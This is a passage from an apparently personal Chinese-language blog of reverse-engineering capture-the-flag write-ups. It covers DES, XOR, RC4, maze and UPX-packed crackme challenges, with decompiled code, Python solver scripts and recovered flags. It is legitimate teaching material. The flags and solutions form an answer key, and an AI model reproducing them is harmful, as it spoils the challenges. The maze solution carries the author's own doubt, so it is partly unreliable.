class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> encryptKey = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> EncryptData = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line">            <span class="built_in">byte</span>[] array = Convert.FromBase64String(str);</span><br><span class="line">            DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">            cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">            cryptoStream.FlushFinalBlock();</span><br><span class="line">            <span class="built_in">byte</span>[] bytes2 = memoryStream.ToArray();</span><br><span class="line">            cryptoStream.Close();</span><br><span class="line">            memoryStream.Close();</span><br><span class="line">            <span class="keyword">return</span> Encoding.Unicode.GetString(bytes2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MyClass myClass = <span class="keyword">new</span> MyClass();</span><br><span class="line">        <span class="built_in">string</span> decryptedData = myClass.Decrypt(myClass.EncryptData);</span><br><span class="line">        Console.WriteLine(decryptedData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#He_P1ay_Basketball_Very_We11!Hahahahaha!</span></span><br></pre></td></tr></table></figure><p>问题来了，结果不对，不是很能理解，去网上看wping</p><p>最后跟着教程做，一直都做不出来，在大佬指点之下，发现是因为电脑报毒把某个文件删了还不提醒，找到那个文件：，打开发现是二进制文件，放进die分析，是pe文件，加了UPX壳，用upx的官方程序脱壳</p><p>打开之后</p><p><img src="https://s2.loli.net/2023/12/13/9t4dPNYcOGzvWSq.png" alt="image-20231213231111411"></p><p>大致是加载了一个dll</p><p>终于点按钮有提示了：<img src="https://s2.loli.net/2023/12/13/hCZbXYD5cVGIT1K.png" alt="image-20231213231322058" style="zoom:25%;" /></p><p>根据网上博客，CE分析mono</p><p><img src="https://s2.loli.net/2023/12/13/pif5YAZkJ91rMOE.png" alt="image-20231213231845210"></p><p>发现和之前那个很类似，并且这个dll在恢复报毒文件之后才出现</p><p>用mono分析功能把main放到窗口下方，按按钮</p><p><img src="https://s2.loli.net/2023/12/13/LGKcgE3eMAdkuZW.png" alt="image-20231213233408953"></p><p><img src="https://s2.loli.net/2023/12/13/JkYizLnvWXbeK3S.png" alt="image-20231213233422155"></p><p>得到密钥test，然后<code>勾选上UTF-16</code>搜Emmmm提示词，发现出现了两次，第二次的位置打开内存窗口：</p><p><img src="https://s2.loli.net/2023/12/15/cNLMb7mnWEIsRwz.png" alt="image-20231215103737650"></p><p>这是第二组密文，下面也有密钥test，复制下来，解密</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">785A57445A614B4568574E4D43626947595042496C59332B61726F7A4F397A6F6E7772594C69564C346E6A53657A3252594D32577773476E736E6A43446E4873374E34336146764E4535346E6F53616450394638654570765473355150472B4B4C305444452F34306E62553D</span><br></pre></td></tr></table></figure><p>转为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">xZWDZaKEhWNMCbiGYPBIlY3</span>+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/<span class="number">40</span>nbU=</span><br></pre></td></tr></table></figure><p>用密钥test和刚刚的算法得</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">She_P1ay_Black_Hole_Very_Wel1!LOL!XD!</span><br></pre></td></tr></table></figure><p>c#，假答案，DES，base64，CE，mono</p><hr><h1>NSSCTF</h1><h2 id="wordy">wordy</h2><p>打开ida后发现没有main函数，start里面标红，怀疑有花指令，到汇编中查找main，用<code>alt+t</code>键，找到后：</p><p><img src="https://s2.loli.net/2023/12/15/542PxaSHyIoe3df.png" alt="image-20231215105547630"></p><p>发现确实是花指令，先u，再跳一个数据c，多来几次，就会发现垃圾数据是0EBh，同时每两个eb之间都有putchar指令输出一个字符，由于0XEB是不可见的所以，打开hex窗口只会留下putchar的字符：</p><p><img src="https://s2.loli.net/2023/12/15/MOCnBqmFXe4tGZu.png" alt="image-20231215110118700"></p><p>得flag:GFCTF{u_are2wordy}</p><p>花指令，hex，脚本</p><hr><h1>ganctf 2023</h1><h2 id="py-python">py?python!</h2><p>打开文件：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = []</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(<span class="built_in">ord</span>(data[i]) ^ <span class="built_in">ord</span>(key[i % key_len]))</span><br><span class="line">    <span class="keyword">return</span> encrypted_data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = [<span class="number">19</span>, <span class="number">78</span>,<span class="number">6</span> , <span class="number">68</span>, <span class="number">17</span>, <span class="number">36</span>, <span class="number">23</span>,<span class="number">63</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">51</span>, <span class="number">38</span>, <span class="number">41</span>, <span class="number">95</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">71</span>, <span class="number">43</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">96</span></span><br><span class="line">, <span class="number">55</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">21</span>,<span class="number">54</span>]</span><br><span class="line">key = <span class="string">&quot;Python&quot;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;请输入flag&quot;</span>)</span><br><span class="line">encrypted_data = encrypt(flag, key)</span><br><span class="line"><span class="keyword">if</span> encrypted_data == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Good!You find it&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sorry,Try again&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很简单的加密算法，直接逆向即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">19</span>, <span class="number">78</span>,<span class="number">6</span> , <span class="number">68</span>, <span class="number">17</span>, <span class="number">36</span>, <span class="number">23</span>,<span class="number">63</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">51</span>, <span class="number">38</span>, <span class="number">41</span>, <span class="number">95</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">71</span>, <span class="number">43</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">96</span></span><br><span class="line">, <span class="number">55</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">21</span>,<span class="number">54</span>]</span><br><span class="line">key = <span class="string">&quot;Python&quot;</span></span><br><span class="line">last =last[::-<span class="number">1</span>]</span><br><span class="line">be = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">        be += (<span class="built_in">chr</span>((last[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])))</span><br><span class="line"><span class="built_in">print</span>(be)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@r3_R3@l1y_G0OD_@t_Pyth0n!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Ezmaze">Ezmaze</h2><p>打开ida，检查main，化简后大概是：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="function">__fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-B0h] BYREF</span></span><br><span class="line">  __int64 tab[<span class="number">5</span>]; <span class="comment">// [rsp+90h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line">  __int64 check; <span class="comment">// [rsp+BCh] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> b; <span class="comment">// [rsp+C4h] [rbp-Ch]</span></span><br><span class="line">  __int64 a; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"><span class="keyword">int</span> ch1,ch2;</span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  qmemcpy(tab, <span class="string">&quot;@01111010110011110011110100#01&quot;</span>, <span class="number">30</span>);</span><br><span class="line">  a = <span class="number">0</span>i64;</span><br><span class="line">  <span class="comment">//puts(&amp;Buffer);                                // 可怜的猫猫在迷宫里迷路了,你能找到它在哪吗？</span></span><br><span class="line">  <span class="comment">//puts(&amp;byte_40402C);                           // 请输入路径,找到猫猫</span></span><br><span class="line">  gets(path);</span><br><span class="line">  len = strlen(path);</span><br><span class="line">  b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    check = a;</span><br><span class="line">    c = path[b];</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ch2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c &gt; <span class="number">100</span> )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ( c == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ch1++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c == <span class="number">119</span> )</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        ch1--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c == <span class="number">97</span> )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      ch2--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ++b &gt; len</span><br><span class="line">      || ch1 &gt; <span class="number">5</span></span><br><span class="line">      || (unsigned <span class="keyword">int</span>)check &gt; <span class="number">4</span></span><br><span class="line">      || (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;0&#x27;</span></span><br><span class="line">      &amp;&amp; (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;@&#x27;</span></span><br><span class="line">      &amp;&amp; (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = check;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)tab + <span class="number">5</span> * HIDWORD(a) + (<span class="keyword">int</span>)a) == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//puts(&amp;byte_404040);</span></span><br><span class="line">    <span class="comment">//system(&quot;Pause&quot;);                            // 成功</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//printf(&amp;Format);                            // 失败</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//system(&quot;Pause&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析check的值可知它的高32位储存纵方向数值，低32位储存横方向数值，a,w为减sd为加。跳出循环条件表明至少s5次，d4次，把tab改成迷宫：</p><blockquote><p>@0111</p><p>10101</p><p>10011</p><p>11001</p><p>11101</p><p>00#01</p></blockquote><p>可得@为开始位置，#为末位置</p><p>dssdsdssa即可（但是d也没有4次呀？奇怪）</p><p>flag{dssdsdssa}</p><p>逆向分析，正向求解</p><hr><h2 id="easy-xor">easy_xor</h2><p>这个题也很简单，ida分析后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line">*(_QWORD *)enc = <span class="number">0x6E6E717F64636D66</span>i64;</span><br><span class="line"><span class="built_in">strcpy</span>(&amp;enc[<span class="number">8</span>], <span class="string">&quot;&#123;V;xSLQi|pun&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the flag: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">20</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid flag length! Exiting...&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(flag); ++j )</span><br><span class="line">  flag[j] ^= j;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, enc) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>直接动态调试找enc的地址异或</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(get_wide_byte(<span class="number">0x62FDF0</span>+i)^i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] ))</span><br><span class="line"><span class="comment">#flag&#123;this_1s_A_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="easy-upx">easy_upx</h2><p>这个在upx官方的脱壳软件脱壳后打开main转换字符串即可，或直接打开hex视图：</p><p>flag{UXP_yyds!}</p><p>UPX，hex</p><hr><h2 id="try-reverse-it">try_reverse_it</h2><p>有一个upx壳，先脱掉，然后进入main查看：</p><p>发现是rc4加密，之前没有学过，所以现学：</p><p>整个加密分为三个阶段：</p><ul><li>初始化，S盒初始化为顺序线性列表，用已知的key填满T盒如果key长度小于T盒大小，就一直重复直到填满</li><li>混乱化：在循环中，把第i位的S和一个由这个S和T盒生成的算法计算出的S[j]交换</li><li>用混乱化之后的S盒和flag进行加密i次每次取1位,由于rc4加密是对称的所以一般用异或,同时每次加密会同时交换由S[i]变换的来的S[j]交换,所以每次加密都是在上一次基础上完成的</li></ul><p>而这道题也只是把每一位flag和那一位计算的S异或,所以完全可以顺着先把S盒求出来,根据异或的性质直接把最后的值异或得到答案</p><p>补充一个细节:之前我写的脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>这两个都是错误的,第一个的t.join(chr(flag[i]))意思是返回<code>把后方传入的列表变成一个字符串间隔字符是t</code>的字符串,但是我并没有用字符串接收这个返回值,导致没有改变</p><p>第二个是因为’'.join每次都会初始化t,改成+=就好了</p><p>exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, </span><br><span class="line">       <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x74</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x6C</span>, <span class="number">0xF8</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0x8B</span>, <span class="number">0x18</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0x76</span>, <span class="number">0xB5</span>, <span class="number">0xFB</span>, <span class="number">0x50</span>, <span class="number">0xF5</span>, </span><br><span class="line">        <span class="number">0x2C</span>, <span class="number">0x5F</span>, <span class="number">0xF3</span>, <span class="number">0x10</span>, <span class="number">0xCB</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xEA</span>, <span class="number">0x9A</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, </span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0x8F</span>, <span class="number">0x21</span>, <span class="number">0x29</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0xCA</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="comment">#初始化T,S</span></span><br><span class="line">S = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">256</span>):</span><br><span class="line">    S[<span class="number">255</span>-i] = i</span><br><span class="line">T = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    T[i] = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#打乱S</span></span><br><span class="line">a = b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    a = S[i]</span><br><span class="line">    b = (a+T[i]+b) % <span class="number">256</span></span><br><span class="line">    S[i] = S[b]</span><br><span class="line">    S[b] = a</span><br><span class="line"><span class="comment">#S盒初始化成功,异或算法相同，所以相当于再来一次</span></span><br><span class="line">m = n = <span class="number">0</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>):</span><br><span class="line">    m = (m + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    k = S[m]</span><br><span class="line">    n = (k+n) % <span class="number">256</span></span><br><span class="line">    S[m] = S[n]</span><br><span class="line">    S[n] = k</span><br><span class="line">    flag[i] = last[i] ^ S[(k + S[m]) % <span class="number">256</span>]</span><br><span class="line">t =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t +=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_5eem_1ike4pro_revers3r&#125;</span></span><br></pre></td></tr></table></figure><p>UPX，RC4</p><h2 id="BrownFox">BrownFox</h2><p>ida直接打开,先动态调试把improvefox函数之后的fox拿出来,再把最后的检测函数拿出来,变换全在tofox里面所以详细看tofox,化简之后:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != num;i++ )</span><br><span class="line">  &#123;</span><br><span class="line">    k = flag[i] &gt;&gt; <span class="number">3</span>;<span class="comment">//k最大15得前4位</span></span><br><span class="line">    check[<span class="number">2</span> * i] = fox[flag[i] &amp; <span class="number">7</span>];<span class="comment">//最大7得后三位</span></span><br><span class="line">    check[<span class="number">2</span> * i+ <span class="number">1</span>] = fox[k]</span><br><span class="line">  &#125;</span><br><span class="line">check += <span class="number">2</span> * num;</span><br><span class="line">*check = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里的变换是非连续性的所以k&lt;&lt;3+check[2*i]在fox中的位置可得flag</p><p>注:fox一开始是有重复字符的,但是在improvefox之后没有了</p><p>最后又被坑了,注意python中位移优先度低于±,异或也是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fox = [<span class="number">0x41</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, </span><br><span class="line">       <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x6A</span>, <span class="number">0x31</span>, </span><br><span class="line">       <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x74</span>, </span><br><span class="line">       <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, </span><br><span class="line">       <span class="number">0x67</span>]</span><br><span class="line">sng = [<span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x78</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x72</span>, <span class="number">0x30</span>, </span><br><span class="line">       <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x62</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0x78</span>, <span class="number">0x72</span>, <span class="number">0x78</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6F</span>, <span class="number">0x41</span>, <span class="number">0x6F</span>, </span><br><span class="line">       <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x30</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x62</span>, <span class="number">0x6A</span>, </span><br><span class="line">       <span class="number">0x6B</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0x72</span>, 